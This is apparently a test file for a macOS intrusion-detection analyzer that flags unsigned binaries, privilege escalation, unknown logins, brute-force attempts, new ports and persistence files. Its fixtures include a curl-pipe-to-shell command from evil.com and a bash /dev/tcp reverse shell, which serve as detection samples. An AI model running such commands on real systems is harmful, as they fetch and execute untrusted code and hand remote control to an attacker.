import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  analyzeProcessEvents,
  analyzeLoginEvents,
  analyzeFailedAuth,
  analyzeListeningPorts,
  analyzeFileEvents,
  formatAlert,
} from "../analyzer.js";
import type { SentinelConfig } from "../config.js";

const baseConfig: SentinelConfig = {
  trustedPaths: ["/usr/bin/", "/bin/", "/sbin/"],
  trustedSigningIds: ["com.apple.", "com.google.Chrome"],
};

describe("analyzeProcessEvents", () => {
  it("detects unsigned binary execution", () => {
    const rows = [
      {
        path: "/tmp/evil",
        cmdline: "/tmp/evil --payload",
        uid: "501",
        euid: "501",
        signing_id: "",
        platform_binary: "0",
        username: "attacker",
      },
    ];
    const events = analyzeProcessEvents(rows, baseConfig);
    assert.equal(events.length, 1);
    assert.equal(events[0].severity, "high");
    assert.equal(events[0].category, "process");
    assert.ok(events[0].title.includes("Unsigned"));
  });

  it("skips trusted paths", () => {
    const rows = [
      {
        path: "/usr/bin/curl",
        cmdline: "curl https://example.com",
        uid: "501",
        euid: "501",
        signing_id: "",
        platform_binary: "0",
        username: "user",
      },
    ];
    const events = analyzeProcessEvents(rows, baseConfig);
    assert.equal(events.length, 0);
  });

  it("skips trusted signing IDs", () => {
    const rows = [
      {
        path: "/Applications/Chrome.app/Contents/MacOS/Chrome",
        cmdline: "Chrome",
        uid: "501",
        euid: "501",
        signing_id: "com.google.Chrome",
        platform_binary: "0",
        username: "user",
      },
    ];
    const events = analyzeProcessEvents(rows, baseConfig);
    assert.equal(events.length, 0);
  });

  it("detects privilege escalation (uid != euid=0)", () => {
    const rows = [
      {
        path: "/opt/backdoor",
        cmdline: "/opt/backdoor",
        uid: "501",
        euid: "0",
        signing_id: "com.backdoor",
        platform_binary: "1",
        username: "user",
      },
    ];
    const events = analyzeProcessEvents(rows, baseConfig);
    assert.equal(events.length, 1);
    assert.equal(events[0].severity, "high");
    assert.equal(events[0].category, "privilege");
  });

  it("detects suspicious commands (curl | sh)", () => {
    const rows = [
      {
        path: "/opt/homebrew/bin/bash",
        cmdline: "curl https://evil.com/install.sh | sh",
        uid: "501",
        euid: "501",
        signing_id: "com.bash",
        platform_binary: "1",
        username: "user",
      },
    ];
    const events = analyzeProcessEvents(rows, baseConfig);
    assert.equal(events.length, 1);
    assert.ok(events[0].title.includes("Suspicious"));
  });

  it("detects reverse shell patterns", () => {
    const rows = [
      {
        path: "/opt/homebrew/bin/bash",
        cmdline: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        uid: "501",
        euid: "501",
        signing_id: "com.bash",
        platform_binary: "1",
        username: "user",
      },
    ];
    const events = analyzeProcessEvents(rows, baseConfig);
    assert.equal(events.length, 1);
  });

  it("returns empty for normal signed processes", () => {
    const rows = [
      {
        path: "/Applications/Safari.app/Contents/MacOS/Safari",
        cmdline: "Safari",
        uid: "501",
        euid: "501",
        signing_id: "com.apple.Safari",
        platform_binary: "1",
        username: "user",
      },
    ];
    const events = analyzeProcessEvents(rows, baseConfig);
    assert.equal(events.length, 0);
  });
});

describe("analyzeLoginEvents", () => {
  const knownHosts = new Set(["192.168.1.100", "100.64.0.1"]);

  it("detects unknown remote host", () => {
    const rows = [
      { user: "root", host: "203.0.113.42", type: "user" },
    ];
    const events = analyzeLoginEvents(rows, knownHosts);
    assert.equal(events.length, 1);
    assert.equal(events[0].severity, "high");
    assert.equal(events[0].category, "auth");
  });

  it("skips known hosts", () => {
    const rows = [
      { user: "sunil", host: "192.168.1.100", type: "user" },
    ];
    const events = analyzeLoginEvents(rows, knownHosts);
    assert.equal(events.length, 0);
  });

  it("skips Tailscale CGNAT range (100.64-127.x.x)", () => {
    const rows = [
      { user: "sunil", host: "100.79.207.74", type: "user" },
      { user: "sunil", host: "100.94.48.17", type: "user" },
      { user: "sunil", host: "100.127.255.255", type: "user" },
    ];
    const events = analyzeLoginEvents(rows, new Set());
    assert.equal(events.length, 0);
  });

  it("does NOT skip non-Tailscale 100.x IPs", () => {
    const rows = [
      { user: "user", host: "100.1.2.3", type: "user" },   // below 100.64
      { user: "user", host: "100.128.0.1", type: "user" },  // above 100.127
    ];
    const events = analyzeLoginEvents(rows, new Set());
    assert.equal(events.length, 2);
  });

  it("skips localhost and empty hosts", () => {
    const rows = [
      { user: "sunil", host: "", type: "user" },
      { user: "sunil", host: "localhost", type: "user" },
      { user: "sunil", host: "127.0.0.1", type: "user" },
      { user: "sunil", host: "::1", type: "user" },
    ];
    const events = analyzeLoginEvents(rows, new Set());
    assert.equal(events.length, 0);
  });
});

describe("analyzeFailedAuth", () => {
  it("returns critical for 10+ failures (brute force)", () => {
    const rows = Array.from({ length: 12 }, (_, i) => ({
      time: String(Date.now()),
      message: `Failed password for root from 10.0.0.${i}`,
    }));
    const events = analyzeFailedAuth(rows);
    assert.equal(events.length, 1);
    assert.equal(events[0].severity, "critical");
    assert.ok(events[0].title.includes("brute force"));
  });

  it("returns high for 3-9 failures", () => {
    const rows = Array.from({ length: 5 }, () => ({
      time: String(Date.now()),
      message: "Failed password for admin",
    }));
    const events = analyzeFailedAuth(rows);
    assert.equal(events.length, 1);
    assert.equal(events[0].severity, "high");
  });

  it("returns medium for 1-2 failures", () => {
    const rows = [{ time: String(Date.now()), message: "Failed password" }];
    const events = analyzeFailedAuth(rows);
    assert.equal(events.length, 1);
    assert.equal(events[0].severity, "medium");
  });

  it("returns empty for no failures", () => {
    const events = analyzeFailedAuth([]);
    assert.equal(events.length, 0);
  });
});

describe("analyzeListeningPorts", () => {
  const knownPorts = new Set([22, 80, 443, 5432]);

  it("detects new listening port", () => {
    const rows = [
      { port: "4444", name: "nc", path: "/usr/bin/nc", address: "0.0.0.0" },
    ];
    const events = analyzeListeningPorts(rows, knownPorts);
    assert.equal(events.length, 1);
    assert.equal(events[0].severity, "medium");
    assert.equal(events[0].category, "network");
  });

  it("skips known ports", () => {
    const rows = [
      { port: "443", name: "nginx", path: "/usr/sbin/nginx", address: "0.0.0.0" },
    ];
    const events = analyzeListeningPorts(rows, knownPorts);
    assert.equal(events.length, 0);
  });

  it("skips localhost-only bindings", () => {
    const rows = [
      { port: "9999", name: "dev", path: "/usr/bin/dev", address: "127.0.0.1" },
      { port: "9998", name: "dev", path: "/usr/bin/dev", address: "::1" },
    ];
    const events = analyzeListeningPorts(rows, new Set());
    assert.equal(events.length, 0);
  });
});

describe("analyzeFileEvents", () => {
  it("detects critical file modification (/etc/sudoers)", () => {
    const rows = [
      { filename: "/etc/sudoers", event_type: "modified", path: "/usr/bin/vi", pid: "1234" },
    ];
    const events = analyzeFileEvents(rows);
    assert.equal(events.length, 1);
    assert.equal(events[0].severity, "critical");
  });

  it("detects LaunchDaemon persistence", () => {
    const rows = [
      {
        filename: "/Library/LaunchDaemons/com.evil.plist",
        event_type: "created",
        path: "/usr/bin/cp",
        pid: "5678",
      },
    ];
    const events = analyzeFileEvents(rows);
    assert.equal(events.length, 1);
    assert.equal(events[0].severity, "high");
    assert.ok(events[0].title.includes("Launch daemon"));
  });

  it("ignores non-critical file changes", () => {
    const rows = [
      { filename: "/tmp/random.txt", event_type: "modified", path: "/usr/bin/touch", pid: "999" },
    ];
    const events = analyzeFileEvents(rows);
    assert.equal(events.length, 0);
  });
});

describe("formatAlert", () => {
  it("formats critical event with emoji", () => {
    const evt = {
      id: "test-id",
      timestamp: 1771695600000,
      severity: "critical" as const,
      category: "auth" as const,
      title: "Brute force attack",
      description: "50 failed attempts",
      details: {},
      hostname: "test-host",
    };
    const text = formatAlert(evt);
    assert.ok(text.includes("🚨"));
    assert.ok(text.includes("CRITICAL"));
    assert.ok(text.includes("Brute force attack"));
  });

  it("formats medium event with yellow emoji", () => {
    const evt = {
      id: "test-id",
      timestamp: Date.now(),
      severity: "medium" as const,
      category: "network" as const,
      title: "New port",
      description: "Port 4444 opened",
      details: {},
      hostname: "test-host",
    };
    const text = formatAlert(evt);
    assert.ok(text.includes("🟡"));
  });
});
